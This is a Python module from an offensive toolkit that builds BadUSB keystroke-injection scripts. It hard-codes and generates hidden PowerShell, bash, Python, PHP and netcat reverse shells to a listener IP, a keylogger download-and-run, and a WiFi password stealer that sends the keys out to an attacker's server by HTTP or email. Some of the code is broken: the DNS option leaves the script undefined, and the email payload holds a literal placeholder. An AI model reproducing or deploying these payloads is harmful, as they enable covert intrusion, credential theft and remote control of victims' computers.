#!/usr/bin/env python3
"""BadUSB Tools Module - HID attack scripts for OTG"""

import os
import json
import time
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich import box

from .utils import clear_screen


class BadUsbTools:
    def __init__(self, console):
        self.console = console
        self.scripts_dir = os.path.join(
            os.path.dirname(os.path.dirname(__file__)),
            "data", "badusb"
        )
        os.makedirs(self.scripts_dir, exist_ok=True)

    def _banner(self):
        self.console.print(Panel.fit(
            "[bold magenta]⌨️  BAD USB TOOLS[/bold magenta]\n"
            "[white]HID Attack Scripts for USB-OTG (Rubber Ducky style)[/white]",
            border_style="magenta"
        ))

    def menu(self):
        while True:
            clear_screen()
            self._banner()
            table = Table(box=box.ROUNDED, border_style="magenta", show_header=False)
            table.add_column("Option", style="bold yellow", width=4)
            table.add_column("Action", width=25)
            table.add_column("Description", style="white", width=40)
            table.add_row("1", "[magenta]Script Library[/magenta]", "Browse pre-made BadUSB scripts")
            table.add_row("2", "[magenta]Create Script[/magenta]", "Create custom HID attack script")
            table.add_row("3", "[magenta]Convert Ducky[/magenta]", "Convert Rubber Ducky script to payload")
            table.add_row("4", "[magenta]Saved Scripts[/magenta]", "View saved/modified scripts")
            table.add_row("5", "[magenta]Payload Generator[/magenta]", "Generate reverse shell payloads")
            table.add_row("6", "[magenta]WiFi Stealer[/magenta]", "Generate script to exfil saved WiFi passwords")
            table.add_row("7", "[red]Back[/red]", "Return to main menu")
            self.console.print(table)
            choice = Prompt.ask("[bold yellow]Select option[/bold yellow]", default="7")

            actions = {
                "1": self.script_library,
                "2": self.create_script,
                "3": self.convert_ducky,
                "4": self.saved_scripts,
                "5": self.payload_generator,
                "6": self.wifi_stealer,
                "7": lambda: None,
            }
            action = actions.get(choice)
            if action is None:
                self.console.print("[red]Invalid choice[/red]")
                continue
            if choice == "7":
                break
            action()

    def script_library(self):
        clear_screen()
        self._banner()
        self.console.print("[cyan]📚 BadUSB Script Library[/cyan]\n")

        scripts = [
            {
                "name": "Reverse Shell (PowerShell)",
                "os": "Windows",
                "desc": "Opens PowerShell reverse shell to listener",
                "code": (
                    "DELAY 1000\n"
                    "GUI r\n"
                    "DELAY 500\n"
                    "STRING powershell -NoP -NonI -W Hidden -Exec Bypass "
                    "$c=New-Object System.Net.Sockets.TCPClient('IP',PORT);"
                    "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
                    "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
                    "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
                    "$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';"
                    "$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);"
                    "$s.Flush()};$c.Close()\n"
                    "ENTER\n"
                ),
            },
            {
                "name": "WiFi Password Stealer",
                "os": "Windows",
                "desc": "Exfiltrates saved WiFi passwords via PowerShell",
                "code": (
                    "DELAY 1000\n"
                    "GUI r\n"
                    "DELAY 500\n"
                    "STRING powershell -NoP -NonI -W Hidden -Exec Bypass "
                    "$profiles=netsh wlan show profiles|Select-String ': '|%{$_.ToString().Split(':')[1].Trim()};"
                    "$results=@();foreach($p in $profiles){"
                    "$key=netsh wlan show profile name=$p key=clear|Select-String 'Key Content';"
                    "$results+=[PSCustomObject]@{SSID=$p;Password=$key}};"
                    "$results|Export-Csv -Path $env:temp\\wifi.csv -NoTypeInformation;"
                    "echo 'done'\n"
                    "ENTER\n"
                    "DELAY 2000\n"
                    "STRING powershell -NoP -NonI -W Hidden "
                    "$wc=New-Object Net.WebClient;$wc.UploadFile('http://YOUR_SERVER/upload',"
                    "'$env:temp\\wifi.csv')\n"
                    "ENTER\n"
                ),
            },
            {
                "name": "Keylogger Install",
                "os": "Windows",
                "desc": "Downloads and executes a keylogger",
                "code": (
                    "DELAY 1000\n"
                    "GUI r\n"
                    "DELAY 500\n"
                    "STRING powershell -NoP -NonI -W Hidden -Exec Bypass "
                    "$wc=New-Object Net.WebClient;"
                    "$wc.DownloadFile('http://YOUR_SERVER/keylog.exe','$env:temp\\kl.exe');"
                    "Start-Process '$env:temp\\kl.exe'\n"
                    "ENTER\n"
                ),
            },
            {
                "name": "Linux Reverse Shell",
                "os": "Linux",
                "desc": "Bash reverse shell via xterm or netcat",
                "code": (
                    "DELAY 1000\n"
                    "ALT F2\n"
                    "DELAY 500\n"
                    "STRING xterm -e 'bash -i >& /dev/tcp/IP/PORT 0>&1'\n"
                    "ENTER\n"
                ),
            },
            {
                "name": "macOS Payload",
                "os": "macOS",
                "desc": "Opens reverse shell on macOS via Terminal",
                "code": (
                    "DELAY 1000\n"
                    "GUI SPACE\n"
                    "DELAY 500\n"
                    "STRING terminal\n"
                    "ENTER\n"
                    "DELAY 1000\n"
                    "STRING bash -i >& /dev/tcp/IP/PORT 0>&1\n"
                    "ENTER\n"
                ),
            },
        ]

        table = Table(title="Available Scripts", box=box.ROUNDED, border_style="magenta")
        table.add_column("#", style="bold yellow")
        table.add_column("Name", style="bold")
        table.add_column("OS", style="cyan")
        table.add_column("Description")
        for i, s in enumerate(scripts, 1):
            table.add_row(str(i), s["name"], s["os"], s["desc"])
        self.console.print(table)

        choice = Prompt.ask("[bold yellow]View script details? (1-5, Enter=back)[/bold yellow]", default="")
        if choice and choice.isdigit() and 1 <= int(choice) <= len(scripts):
            s = scripts[int(choice) - 1]
            self.console.print(Panel(
                s["code"],
                title=f"{s['name']} ({s['os']})",
                border_style="magenta",
                subtitle="Ducky Script"
            ))
            if Confirm.ask("[yellow]Save this script?[/yellow]", default=False):
                path = os.path.join(self.scripts_dir, f"{s['name'].replace(' ', '_').lower()}.txt")
                with open(path, "w") as f:
                    f.write(s["code"])
                self.console.print(f"[green]Saved to {path}[/green]")

        Prompt.ask("[bold yellow]Press Enter[/bold yellow]")

    def create_script(self):
        clear_screen()
        self._banner()
        self.console.print("[cyan]✏️  Create Custom BadUSB Script[/cyan]\n")

        name = Prompt.ask("[bold]Script name[/bold]")
        os_type = Prompt.ask("[bold]Target OS[/bold]",
                             choices=["Windows", "Linux", "macOS", "Android"],
                             default="Windows")

        self.console.print("\n[yellow]Enter Ducky Script commands (one per line)[/yellow]")
        self.console.print("[dim]Available: DELAY, STRING, ENTER, GUI, CTRL, ALT, SHIFT[/dim]")
        self.console.print("[dim]Type 'END' on a new line to finish[/dim]\n")

        lines = []
        while True:
            line = Prompt.ask("[bold cyan]>>[/bold cyan]")
            if line.upper() == "END":
                break
            lines.append(line)

        script = "\n".join(lines)
        if not script:
            self.console.print("[red]No commands entered. Aborting.[/red]")
            Prompt.ask("[bold yellow]Press Enter[/bold yellow]")
            return

        self.console.print(Panel(script, title=f"Script: {name} ({os_type})",
                                 border_style="magenta"))

        if Confirm.ask("[yellow]Save script?[/yellow]", default=True):
            path = os.path.join(self.scripts_dir, f"{name.lower().replace(' ', '_')}.txt")
            with open(path, "w") as f:
                f.write(f"REM {name}\nREM Target: {os_type}\nREM Created: {time.ctime()}\n\n{script}")
            self.console.print(f"[green]Saved to {path}[/green]")

        Prompt.ask("[bold yellow]Press Enter[/bold yellow]")

    def convert_ducky(self):
        clear_screen()
        self._banner()
        self.console.print("[cyan]🦆 Convert Rubber Ducky Script[/cyan]\n")

        source = Prompt.ask("[bold]Path to Ducky script[/bold]")
        if not os.path.exists(source):
            self.console.print(f"[red]File not found: {source}[/red]")
            Prompt.ask("[bold yellow]Press Enter[/bold yellow]")
            return

        with open(source) as f:
            content = f.read()

        self.console.print(f"[green]Loaded {len(content)} chars from {source}[/green]")

        payload = []
        for line in content.split("\n"):
            line = line.strip()
            if not line or line.startswith("REM"):
                continue
            payload.append(line)

        output_name = Prompt.ask("[bold]Output name[/bold]",
                                 default=os.path.basename(source).replace(".txt", "_payload.txt"))
        output_path = os.path.join(self.scripts_dir, output_name)

        with open(output_path, "w") as f:
            f.write("\n".join(payload))

        self.console.print(f"[green]Converted payload saved to {output_path}[/green]")
        self.console.print(Panel(
            f"Original commands: {len(content.split(chr(10)))}\n"
            f"Payload commands: {len(payload)}\n"
            f"Ready for HID device",
            title="Conversion Complete", border_style="magenta"
        ))
        Prompt.ask("[bold yellow]Press Enter[/bold yellow]")

    def saved_scripts(self):
        clear_screen()
        self._banner()
        files = [f for f in os.listdir(self.scripts_dir) if f.endswith(".txt")]

        if not files:
            self.console.print("[yellow]No saved scripts yet.[/yellow]")
        else:
            table = Table(title="Saved BadUSB Scripts", box=box.ROUNDED,
                          border_style="magenta")
            table.add_column("#", style="bold yellow")
            table.add_column("Script", style="bold")
            table.add_column("Size", style="dim")
            table.add_column("Modified", style="dim")

            for i, f in enumerate(files, 1):
                path = os.path.join(self.scripts_dir, f)
                size = os.path.getsize(path)
                mtime = time.ctime(os.path.getmtime(path))
                table.add_row(str(i), f, f"{size} B", mtime)
            self.console.print(table)

            if Confirm.ask("[yellow]View/delete a script?[/yellow]", default=False):
                action = Prompt.ask("Action", choices=["view", "delete", ""], default="")
                if action == "view":
                    name = Prompt.ask("Script name")
                    path = os.path.join(self.scripts_dir, name)
                    if os.path.exists(path):
                        with open(path) as f:
                            self.console.print(Panel(f.read(), title=name,
                                                     border_style="magenta"))
                    else:
                        self.console.print("[red]Not found[/red]")
                elif action == "delete":
                    name = Prompt.ask("Script name to delete")
                    path = os.path.join(self.scripts_dir, name)
                    if os.path.exists(path):
                        os.remove(path)
                        self.console.print(f"[red]Deleted {name}[/red]")
                    else:
                        self.console.print("[red]Not found[/red]")

        Prompt.ask("[bold yellow]Press Enter[/bold yellow]")

    def payload_generator(self):
        clear_screen()
        self._banner()
        self.console.print("[cyan]🚀 Reverse Shell Payload Generator[/cyan]\n")

        ip = Prompt.ask("[bold]Listener IP[/bold]")
        port = Prompt.ask("[bold]Listener Port[/bold]", default="4444")
        lang = Prompt.ask("[bold]Language[/bold]",
                          choices=["powershell", "python", "bash", "php", "nc"],
                          default="python")

        payloads = {
            "powershell": (
                f"powershell -NoP -NonI -W Hidden -Exec Bypass "
                f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
                f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                f"$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';"
                f"$sbt=([text.encoding]::ASCII).GetBytes($sb2);"
                f"$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"
            ),
            "python": (
                f'python3 -c \'import os,pty,socket;'
                f's=socket.socket();s.connect(("{ip}",{port}));'
                f'[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")\''
            ),
            "bash": (
                f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
            ),
            "php": (
                f"php -r '$s=fsockopen(\"{ip}\",{port});"
                f'exec("/bin/sh -i <&3 >&3 2>&3");\''
            ),
            "nc": (
                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
                f"nc {ip} {port} >/tmp/f"
            ),
        }

        payload = payloads[lang]
        self.console.print(Panel(payload, title=f"{lang.upper()} Reverse Shell → "
                                                f"{ip}:{port}",
                                 border_style="green"))

        ducky = (
            f"REM Reverse Shell ({lang}) → {ip}:{port}\n"
            f"DELAY 1000\n"
            f"GUI r\n"
            f"DELAY 500\n"
            f"STRING {payload}\n"
            f"ENTER\n"
        )

        self.console.print("\n[cyan]Ducky Script version:[/cyan]")
        self.console.print(Panel(ducky, title="BadUSB Ready",
                                 border_style="magenta"))

        if Confirm.ask("[yellow]Save BadUSB script?[/yellow]", default=True):
            name = f"revshell_{lang}_{int(time.time())}.txt"
            path = os.path.join(self.scripts_dir, name)
            with open(path, "w") as f:
                f.write(ducky)
            self.console.print(f"[green]Saved to {path}[/green]")

        Prompt.ask("[bold yellow]Press Enter[/bold yellow]")

    def wifi_stealer(self):
        clear_screen()
        self._banner()
        self.console.print("[cyan]📶 WiFi Password Stealer Generator[/cyan]")
        self.console.print("[yellow]Creates a BadUSB script to dump + exfil WiFi passwords[/yellow]\n")

        exfil_url = Prompt.ask("[bold]Exfiltration URL (your server)[/bold]",
                               default="http://YOUR_SERVER:8080/upload")
        method = Prompt.ask("[bold]Exfil method[/bold]",
                            choices=["HTTP", "Email", "DNS"], default="HTTP")

        if method == "HTTP":
            script = (
                f"REM WiFi Password Stealer - Exfil via HTTP\n"
                f"DELAY 1000\n"
                f"GUI r\n"
                f"DELAY 500\n"
                f"STRING powershell -NoP -NonI -W Hidden -Exec Bypass\n"
                f"ENTER\n"
                f"DELAY 2000\n"
                f"STRING $profiles=netsh wlan show profiles|Select-String ': '\n"
                f"ENTER\n"
                f"STRING $results=@();foreach($p in $profiles){{$name=$p.ToString().Split(':')[1].Trim();"
                f"$key=netsh wlan show profile name=$name key=clear|Select-String 'Key Content';"
                f"$results+=[PSCustomObject]@{{SSID=$name;Password=$key}}}}\n"
                f"ENTER\n"
                f"STRING $wc=New-Object Net.WebClient;"
                f"$wc.UploadString('{exfil_url}',"
                f"($results|ConvertTo-Json))\n"
                f"ENTER\n"
            )
        elif method == "Email":
            email_to = Prompt.ask("[bold]Email to[/bold]")
            script = (
                f"REM WiFi Password Stealer - Exfil via Email\n"
                f"DELAY 1000\n"
                f"GUI r\n"
                f"DELAY 500\n"
                f"STRING powershell -NoP -NonI -W Hidden -Exec Bypass\n"
                f"ENTER\n"
                f"DELAY 2000\n"
                f"STRING $profiles=netsh wlan show profiles|Select-String ': '\n"
                f"ENTER\n"
                f"STRING $results=@();foreach($p in $profiles){{...}}\n"
                f"ENTER\n"
                f"STRING Send-MailMessage -To '{email_to}' -From 'stealer@local' "
                f"-Subject 'WiFi Dump' -Body ($results|Out-String) "
                f"-SmtpServer smtp.gmail.com -Port 587\n"
                f"ENTER\n"
            )

        self.console.print(Panel(script, title="WiFi Stealer Ducky Script",
                                 border_style="magenta"))

        if Confirm.ask("[yellow]Save script?[/yellow]", default=True):
            path = os.path.join(self.scripts_dir,
                                f"wifi_stealer_{int(time.time())}.txt")
            with open(path, "w") as f:
                f.write(script)
            self.console.print(f"[green]Saved to {path}[/green]")

        Prompt.ask("[bold yellow]Press Enter[/bold yellow]")
